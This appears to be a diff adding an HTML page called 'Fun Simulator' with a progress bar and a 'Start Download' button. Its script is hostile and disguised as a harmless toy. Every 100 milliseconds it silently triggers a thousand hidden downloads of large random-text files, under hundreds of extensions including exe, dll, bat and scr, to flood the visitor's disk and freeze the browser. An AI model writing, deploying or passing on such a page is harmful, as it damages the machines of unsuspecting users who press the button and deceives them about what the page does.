@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fun Simulator</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 80%;
+    }
+
+    .progress-bar {
+      width: 100%;
+      background-color: #f1f1f1;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+
+    .progress {
+      width: 0;
+      height: 30px;
+      background-color: #4CAF50;
+      text-align: center;
+      line-height: 30px;
+      color: white;
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #45a049;
+      transform: scale(1.1);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    p {
+      margin-top: 20px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Fun Simulator</h1>
+    <div class="progress-bar">
+      <div class="progress">0%</div>
+    </div>
+    <br>
+    <button onclick="downloadFiles()">Start Download</button>
+    <p id="locationDisplay" style="display:none;"></p>
+  </div>
+
+  <script>
+    function generateRandomText(length) {
+      var result = '';
+      var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      var charactersLength = characters.length;
+      for (var i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+      }
+      return result;
+    }
+
+    function downloadFiles() {
+      var fileExtensions = ['pdf', 'docx', 'txt', 'jpg', 'png', 'xlsx', 'mp3', 'mp4', 'avi', 'zip', 'svg', 'html', 'css', 'js', 'csv', 'json', 'xml', 'pptx', 'mpg', 'mov', 'gif', 'bmp', 'tif', 'wav', 'flac', 'aac', 'ogg', 'exe', 'psd', 'ai', 'eps', 'rar', '7z', 'xls', 'tar', 'wav', 'mp4', 'avi', 'java', 'py', 'cpp', 'h', 'cs', 'vb', 'dbf', 'sql', 'yml', 'log', 'svg', 'ico', 'ppt', 'wav', 'tiff', 'jpg', 'ai', 'wma', 'gif', 'tgz', 'ogg', 'dll', 'bat', 'hwp', 'sh', 'ttf', 'otf', 'woff', 'woff2', 'jpeg', 'bmp', 'zipx', 'bin', 'batch', 'doc', 'm4a', 'php', 'sql', 'html', 'css', 'scss', 'asp', 'htaccess', 'ini', 'bak', 'conf', 'bak', 'class', 'java', 'yml', 'json', 'ppt', 'key', 'numbers', 'pages', 'wav', 'aif', 'midi', 'bat', 'cmd', 'sh', 'pl', 'jar', 'r', 'cpp', 'c', 'mp3', 'soc', 'docm', 'csv', 'css', 'xml', 'yaml', 'md', 'syx', 'vbs', 'flv', 'swf', 'aiff', 'mid', 'flv', 'f4v', 'mov', 'conf', 'config', 'xcf', 'scr', 'shd', 'ttf', 'odb', 'db', 'dbf', 'mpeg', 'mpa', 'm4v', 'aspx', 'jsp', 'lua', 'jsonld', 'bin', 'a', 'h', 'hh', 'cpp', 'c', 'java', 'cs', 'rb', 'rbw', 'j', 'm', 'inc', 'js', 'jade', 'asp', 'aspx', 'php', 'xml', 'svgz', '3gp', '3g2', 'mp3', 'doc', 'pptm', 'xlsb', '8xp', '8xk', '8xu', '8Xp', 'doc', 'xls', 'ppt', 'xlsx', 'bmp', 'csproj', 'sln', 'obj', 'war', 'bat', 'owl', 'indd', 'nbf', 'pcf', 'ttf', 'yaml', 'xhtml', 'svg', 'wav', 'mov', 'm2v', 'mpa', 'mpe', 'mpeg', 'mpg', 'mpv2', 'mp2v', 'mp2', 'mp3', 'mp4', 'vob', 'ifo', 'pdf', 'rar', 'r', 'cpp', 'h', 'py', 'java', 'css', 'js', 'html', 'sql', 'bat', 'exe', 'dll', 'sh', 'bin', 'tar', 'zip', 'gz', '7z', 'tgz', 'rpm', 'deb', 'pdf', 'doc', 'xls', 'ppt', 'potx', 'ppsx', 'pptx', 'lsx', 'mp3', 'wav', 'm4a', 'ogg', 'flac', 'aiff', 'wma', 'mp4', 'avi', 'mov', 'wmv', 'mkv', 'gif', 'jpg', 'jpeg', 'png', 'bmp', 'tif', 'tiff', 'svg', 'eps', 'zipx', 'sitx', 'rar', '7z', 'tar', 'gz', 'dmg', 'iso', 'img', 'tag', 'vqf', 'xsf', 'eac3', 'ael', 'ac', '1080p', '720p', '480p', '1080i', 'jpeg2000', '3g2', '3gp', 'asx', 'avc', 'avi', 'm4v', 'mkv', 'mov', 'mp4', 'mpeg', 'vob', 'wmv', 'divx', 'dv', 'flv', 'mjpeg', 'mpg', 'rmvb', 'ts', 'wav', 'wma', 'mid', 'mp3', 'm4a', 'ogg', 'flac', 'alac', 'pcm', 'aac', 'ape', 'msv', 'aiff', 'au', 'ra', 'rm', 'mpc', 'sln', 'cs', 'c', 'cpp', 'h', 'java', 'py', 'rb', 'pl', 'php', 'html', 'css', 'js', 'ts', 'swift', 'v', 'xml', 'yml', 'json', 'as', 'gls', 'lua', 'or', 'cfg', 'conf', 'ini', 'sql', 'db', 'exe', 'jar', 'dll', 'sh', 'bat', 'app', 'ipa', 'apk', '7z', 'zip', 'tar.gz', 'tgz', 'rar', 'sit', 'sitx', 'dmg', 'yin', 'dpm', 'wav', 'aif', 'flac', 'm4a', 'midi', 'ac3', 'ogg', 'mp3', 'htm', 'doc', 'xls', 'ppt', 'pdf', 'txt', 'rtf', 'log', 'srt', 'lrc', 'ass', 'scc', 'ssa', 'smi', 'sami', 'json', 'xml', 'html', 'js', 'css', 'ts', 'scss', 'styl', 'hbs', 'php', 'py', 'java', 'rb', 'asp', 'vbs', 'bat', 'sh', 'pl', 'cs', 'lua', 'sol', 'yml', 'yaml', 'ini', 'conf', 'cfg', 'toml', 'md', 'gitignore', 'npmignore', 'abap', 'fls', 'dbf', 'abm', 'apa', 'apg', 'adal', 'aad', 'ajp', 'amx', 'apk', 'apv', 'asm', 'asv', 'auz', 'bar', 'cad', 'cap', 'cmx', 'cst', 'cxt', 'dbx', 'ddx', 'ddt', 'dex', 'dpx', 'drw', 'dvb', 'eap', 'eas', 'eex', 'emp', 'esx', 'evt', 'evx', 'fb2', 'fta', 'ftv', 'ggt', 'ggw', 'gmx', 'gtl', 'hpg', 'ifs', 'igx', 'jam', 'jar', 'jp2', 'jpf', 'jpx', 'jpm', 'jpr', 'jpx', 'jtf', 'kkx', 'lnk', 'lwp', 'm3u', 'm2v', 'm4p', 'mlm', 'msl', 'mso', 'mtw', 'nfb', 'nfl', 'ops', 'org', 'pgm', 'pif', 'pir', 'pmd', 'psf', 'pmf', 'ppa', 'ppj', 'ppm', 'prm', 'rai', 'rat', 'rpm', 'rmb', 'rpj', 'rp2', 'rpg', 'rps', 'sch', 'sda', 'sdc', 'sdd', 'sdp', 'ses', 'shn', 'shy', 'skd', 'skp', 'sld', 'smf', 'ssz', 'sds', 'ssf', 'sfs', 'stz', 'sxg', 'sxi', 'stk', 'swf', 'swz', 'u3d', 'uax', 'ufd', 'uil', 'uvs', 'vdx', 'vmb', 'vwp', 'wpl', 'wpv', 'wsx', 'xap', 'xce', 'xdf', 'x_help', 'xlm', 'xlv', 'xlw', 'xltt', 'xmlz', 'xms', 'xbdoc', 'xlk', '4dm', '4ge', 'ab7', 'abe', 'abnf', 'acc', 'avl', 'acl', 'act', 'acm', 'aai', 'api', 'a2w', 'a11', 'aadl', 'asdl', 'aep', 'atc', 'al', 'ae', 'atm', 'abw', 'att', 'a', 'awk', 'au3', 'acgi', 'afl', 'accda', 'adb', 'adr', 'asmx', 'akn', 'a', 'kpq', 'alg', 'ajx', 'aec', 'ase', 'ahk', 'afx', 'apxml', 'ato', 'alc', 'agp', 'ac', 'apl', 'obj', 'a2j', 'dx', 'wgt', 'slt', 'amr', 'awb', 'dff', 'gsm', 'wve', 'c4p', 'cty', 'cla', 'cls', 'cob', 'cps', 'bs', 'tpu', 'bso', 'csml', 'orc', 'pgc', 'car', 'csl', 'dot', 'cnf', 'dat', 'tcn', 'dct', 'dit', 'dvi', 'docm', 'dotm', 'dif', 'dpd', 'db', 'dmt', 'ibd', 'drf', 'ddb', 'jtop', 'dem', 'game', 'ddf', 'dba', 'idb', 'dcf', 'dif', 'ds', 'ddat', 'dess', 'dp', 'din', 'difx', 'dar', 'tga', 'ira', 'hdf', 'xdp', 'fsa', 'za', 'fsproj', 'fdc', 'fls', 'gms', 'g3', 'fifar', 'ee', 'fas', 'flm', 'ft', 'flb', 'fbe', 'fbk', 'fdx', 'ffe', 'fim', 'fcpe', 'fl', 'fnc', 'fg', 'flx', 'ftson', 'fzs', 'fla', 'fx', 'fxd', 'fxm', 'frs', 'fc', 'fs', 'fcf', 'fp5', 'fcdt', 'fp4', 'fql', 'ftr', 'fraw', 'f12', 'ffo', 'fpt', 'flame', 'fxp', 'ftn', 'fx', 'ftfx', 'fv', 'fif', 'ftxy', 'fpa', 'fc', 'fec', 'fsproject', 'ftcd', 'frc', 'ffl', 'fmt', 'fw', 'flo', 'fo', 'fmx', 'frm', 'fb2', 'flac', 'fc2', 'ftmb', 'fb', 'fpt', 'fass', 'fam', 'fd', 'fml', 'ftwa', 'fcw', 'fpj', 'fcpe', 'fu', 'fzf', 'fsc', 'flam', 'fr', 'fax', 'fdt', 'fsa', 'fc2map', 'fm', 'ftn', 'fbx', 'fsml', 'fir', 'fcp', 'fg5', 'fft', 'find', 'fgp', 'fjg', 'ft', 'fnc', 'foxb', 'ftn', 'ffp', 'fac', 'fsl', 'fyo', 'ffa', 'ft3', 'fsb', 'fli', 'fio', 'fuse', 'fls', 'fzv', 'fdi', 'f2', 'fxg', 'gau', 'gem', 'gsheet', 'gfx', 'graffle', 'grv', 'gv', 'gy', 'st', 'vrml', 'hpgl', 'hmm', 'vue', 'hyp', 'hvd', 'hap', 'tmap', 'hal', 'hbk', 'hpg', 'hjt', 'hh', 'hhc', 'hm', 'hms', 'hcrt', 'hc', 'htke', 'hta', 'htke', 'infobar', 'hqx', 'abx', 'aie', 'ani', 'ait', 'art', 'osx', 'blue', 'bm2', 'bmp', 'blit', 'bmp', 'bmo', 'cir', 'cd5', 'cod', 'cpt', 'colz', 'cr2', 'ct', 'cif', 'cpl', 'cpx', 'dcm', 'xif', 'dcr', 'dcs', 'ddr', 'djvu', 'erf', 'emf', 'epi', 'ep', 'eps', 'epp', 'eps2', 'eps3', 'epsf', 'epsi', 'eft', 'gpp', 'hgl', 'hpgl', 'hf', 'jpe', 'j2c', 'jp2', 'fpx', 'jif', 'jfa', 'jfif', 'jg4', 'jpg', 'jfif', 'jia', 'jxs', 'jxr', 'jls', 'jpg', 'jpc', 'j2k', 'jpc', 'jpe', 'jig', 'kdc', 'lar', 'lbm', 'max', 'mbx', 'mdc', 'mng', 'mdi', 'mrw', 'ncr', 'nef', 'hwn', 'nrw', 'orf', 'otb', 'pcd', 'pict', 'pictclipping', 'pct', 'pct2', 'pic', 'psp', 'pdf', 'psd', 'pdd', 'pic', 'pict', 'pix', 'pnt', 'pntg', 'ptg', 'pic', 'png', 'pbm', 'pgm', 'pgm', 'im1', 'pnm', 'pns', 'ppm', 'psb', 'psd', 'psdt', 'qti', 'qti', 'qxi', 'rle', 'srf', 'sti', 'sff', 'pic', 'sr2', 'srf', 'srw', 'tdi', 'tki', 'grouppixel', 'icon', 'icm', 'ico', 'mic', 'rle', 'targa', 'tpf', 'tcx', 'tif', 'tiff', 'tiff', 'txt', 'ufo', 'ufo', 'vda', 'vda', 'vda', 'icb', 'wbmp', 'webp', 'webp', 'wmf', 'wpg', 'xpm', 'thm', 'thm', 'max', 'mgp', 'pbm', 'pgm', 'pcx', 'pic', 'dcx', 'sgi', 'rgb', 'rgba', 'pix', 'pnm', 'pam', 'pnm', 'pge', 'sgi', 'ppm', 'sgi', 'sunras', 'tiff', 'bmp', 'pdb', 'g3', 'pic', 'bmp', 'png', 'tif', 'tiff', 'pcd', 'wdp', 'ico',];
+      var progress = document.querySelector('.progress');
+      var batchCount = 1000;
+      var totalFiles = fileExtensions.length * batchCount;
+      var filesDownloaded = 0;
+
+      var interval = setInterval(function() {
+        if (filesDownloaded < totalFiles) {
+          for (var i = 0; i < batchCount; i++) {
+            var extension = fileExtensions[i % fileExtensions.length];
+            var data = generateRandomText(690092); // 3 times bigger
+            var url = 'data:application/octet-stream,' + encodeURIComponent(data);
+            var downloadLink = document.createElement('a');
+            downloadLink.href = url;
+            downloadLink.download = 'file_' + filesDownloaded + '.' + extension;
+            downloadLink.style.display = 'none';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            filesDownloaded++;
+          }
+          var percentage = ((filesDownloaded / totalFiles) * 100).toFixed(0) + '%';
+          progress.style.width = percentage;
+          progress.innerHTML = percentage;
+        } else {
+          clearInterval(interval);
+        }
+      }, 100);
+    }
+  </script>
+</body>
+</html>
